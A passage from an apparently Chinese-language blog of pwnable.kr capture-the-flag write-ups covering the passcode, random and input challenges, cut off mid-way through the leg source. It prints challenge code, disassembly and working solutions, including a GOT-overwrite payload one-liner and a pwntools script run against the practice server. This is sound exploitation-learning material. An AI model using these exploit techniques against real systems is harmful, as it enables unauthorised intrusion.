    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode2 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checking...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>passcode1<span class="token operator">==</span><span class="token number">338150</span> <span class="token operator">&amp;&amp;</span> passcode2<span class="token operator">==</span><span class="token number">13371337</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter you name : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%100s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Toddler's Secure Login System 1.0 beta.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// something after login...</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now I can safely trust you that you have credential :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>利用 scp 把题目拷下来</p>
<pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/tools/die_lin64_portable$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode ./
passcode@pwnable.kr's password: 
passcode                                          100% 7485     7.3KB/s   00:01</code></pre>
<p>再来检测下程序开启了哪些保护措施，注意到 PIE 没有开启</p>
<pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/桌面$ checksec passcode 
[*] '/home/pwn/桌面/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre>
<p>回到代码，注意到<code>scanf(&quot;%d&quot;, passcode1);</code>这段代码是有问题的，首先考虑直接溢出覆盖passcode1 以及 passcode2，338150 == 0x000528e6已经出现了0x00截断，因此无法实现变量覆盖</p>
<p>那么直接覆盖RET呢？注意到开启了 Canary，需要绕过，暂时不会:(</p>
<p>但是注意到 PIE 没有开启，而且passcode1前面没有取地址符号<code>&amp;</code>，我们可以覆盖内存地址为passcode1的数据内容</p>
<p>这样我们通过将 passcode1 设置为 fflush 的 GOT 表单，通过 scanf 将调用地址指向 <code>system(&quot;/bin/cat flag&quot;);</code> 达成绕过认证获取 flag，大致步骤如下：</p>
<ol>
<li><p>从 name 到 passcode1 的长度为 (ebp+0x70) - (ebp-0x10) = 0x80 == 96</p>
</li>
<li><p>看一下 fflush 的 GOT 地址为0x0804a004</p>
<pre class=" language-shell"><code class="language-shell"> pwn@pwn-Parallels-Virtual-Platform:~/桌面$ objdump -R passcode 

 passcode：     文件格式 elf32-i386

 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE 
 08049ff0 R_386_GLOB_DAT    __gmon_start__
 0804a02c R_386_COPY        stdin@@GLIBC_2.0
 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
 0804a014 R_386_JUMP_SLOT   __gmon_start__
 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</code></pre>
</li>
<li><p>再通过 gdb 查看 <code>system(&quot;/bin/cat flag&quot;);</code> 开始调用的指令地址为 0x080485e3，同时注意到scanf 传参时为<code>%d</code>，所以需要转换成 int 型数据</p>
<pre class=" language-armasm"><code class="language-armasm"> (gdb) disassemble login
 Dump of assembler code for function login:
    0x08048564 <+0>:     push   %ebp
    0x08048565 <+1>:     mov    %esp,%ebp
    0x08048567 <+3>:     sub    $0x28,%esp
    0x0804856a <+6>:     mov    $0x8048770,%eax
    0x0804856f <+11>:    mov    %eax,(%esp)
    0x08048572 <+14>:    call   0x8048420 <printf@plt>
    0x08048577 <+19>:    mov    $0x8048783,%eax
    0x0804857c <+24>:    mov    -0x10(%ebp),%edx
    0x0804857f <+27>:    mov    %edx,0x4(%esp)
    0x08048583 <+31>:    mov    %eax,(%esp)
    0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
    0x0804858b <+39>:    mov    0x804a02c,%eax
    0x08048590 <+44>:    mov    %eax,(%esp)
    0x08048593 <+47>:    call   0x8048430 <fflush@plt>
    0x08048598 <+52>:    mov    $0x8048786,%eax
    0x0804859d <+57>:    mov    %eax,(%esp)
    .
    .
    .
    0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
    0x080485de <+122>:   call   0x8048450 <puts@plt>
    0x080485e3 <+127>:   movl   $0x80487af,(%esp)
    0x080485ea <+134>:   call   0x8048460 <system@plt>
    0x080485ef <+139>:   leave  
    0x080485f0 <+140>:   ret    
    0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
    0x080485f8 <+148>:   call   0x8048450 <puts@plt>
    0x080485fd <+153>:   movl   $0x0,(%esp)
    0x08048604 <+160>:   call   0x8048480 <exit@plt>
 End of assembler dump.</code></pre>
</li>
</ol>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">passcode@pwnable:~$ python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)</code></pre>
<h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> random<span class="token punctuation">;</span>
    random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// random value!</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>key <span class="token operator">^</span> random<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xdeadbeef</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong, maybe you should try 2^32 cases.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>因为直接 random 为伪随机，我们只需要知道程序中生成的值是多少就可以直接拿来利用了</p>
<pre class=" language-armasm"><code class="language-armasm">pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:   push   rbp
   0x00000000004005f5 <+1>:   mov    rbp,rsp
   0x00000000004005f8 <+4>:   sub    rsp,0x10
   0x00000000004005fc <+8>:   mov    eax,0x0
   0x0000000000400601 <+13>:  call   0x400500 <rand@plt>
   0x0000000000400606 <+18>:  mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400609 <+21>:  mov    DWORD PTR [rbp-0x8],0x0
   0x0000000000400610 <+28>:  mov    eax,0x400760
   0x0000000000400615 <+33>:  lea    rdx,[rbp-0x8]
   0x0000000000400619 <+37>:  mov    rsi,rdx
   0x000000000040061c <+40>:  mov    rdi,rax
   0x000000000040061f <+43>:  mov    eax,0x0
   0x0000000000400624 <+48>:  call   0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:  mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040062c <+56>:  xor    eax,DWORD PTR [rbp-0x4]
   0x000000000040062f <+59>:  cmp    eax,0xdeadbeef
   0x0000000000400634 <+64>:  jne    0x400656 <main+98>
   0x0000000000400636 <+66>:  mov    edi,0x400763
   0x000000000040063b <+71>:  call   0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:  mov    edi,0x400769
   0x0000000000400645 <+81>:  mov    eax,0x0
   0x000000000040064a <+86>:  call   0x4004d0 <system@plt>
   0x000000000040064f <+91>:  mov    eax,0x0
   0x0000000000400654 <+96>:  jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:  mov    edi,0x400778
   0x000000000040065b <+103>: call   0x4004c0 <puts@plt>
   0x0000000000400660 <+108>: mov    eax,0x0
   0x0000000000400665 <+113>: leave  
   0x0000000000400666 <+114>: ret    
End of assembler dump.</code></pre>
<p>可以确认 random 存在 rbp-0x4，输入值存在 rbp-0x8</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15909964922295.jpg" alt></p>
<p>注意小端存储，所以 random=0x6b8b4567</p>
<p>输入值：0x6b8b4567 ^ 0xdeadbeef = 3039230856</p>
<h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">random@pwnable:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...</code></pre>
<h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// argv</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    

    <span class="token comment" spellcheck="true">// stdio</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// env</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// file</span>
    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    

    <span class="token comment" spellcheck="true">// network</span>
    <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>
    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>
    saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// here's your flag</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>一共有 5 关：</p>
<ol>
<li>传入 100 个参数，参数 ‘A’(65) 为 <code>\x00</code> 参数 ‘B’(66) 为 <code>\x20\x0a\x0d</code></li>
<li>从 stdin 中读取输入 <code>\x00\x0a\x00\xff</code>，stderr 中读取输入<code>\x00\x0a\x02\xff</code></li>
<li>从环境变量去读<code>\xde\xad\xbe\xef</code>，需要值为<code>\xca\xfe\xba\xbe</code></li>
<li>读当前目录下<code>\x0a</code>文件，前 4 个字节需要为<code>\x00\x00\x00\x00</code></li>
<li>读取参数 ‘C’(67) 为端口值，发送<code>b</code>至此端口</li>
</ol>
<h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"input2"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>

conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stdin"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stderr"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"/tmp/sa/\x0a"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">)</span>

args <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"."</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>
args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x00"</span>
args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x20\x0a\x0d"</span>
args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"47362"</span>
envs <span class="token operator">=</span> <span class="token punctuation">{</span>b<span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">:</span>b<span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">}</span>

p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>args<span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/tmp/sa/"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>envs<span class="token punctuation">,</span> executable<span class="token operator">=</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token string">"/tmp/stdin"</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token string">"/tmp/stderr"</span><span class="token punctuation">)</span>

sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
sock <span class="token operator">=</span> conn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">47362</span><span class="token punctuation">)</span>
sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行结果：</p>
<pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/pwnable.kr$ /usr/bin/python3 /home/pwn/pwnable.kr/7_input.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] input2@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process '/home/input2/input' on pwnable.kr: pid 145635
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
[*] Got EOF while reading in interactive</code></pre>
<h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token keyword">int</span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span>
    <span class="token string">"push    {r6}\n"</span>
    <span class="token string">"add    r6, pc, $1\n"</span>
    <span class="token string">"bx        r6\n"</span>
    <span class="token string">".code    16\n"</span>
    <span class="token string">"mov    r3, pc\n"</span>
    <span class="token string">"add    r3, $0x4\n"</span>
    <span class="token string">"push    {r3}\n"</span>
    <span class="token string">"pop    {pc}\n"</span>
    <span class="token string">".code    32\n"</span>
    <span class="token string">"pop    {r6}\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
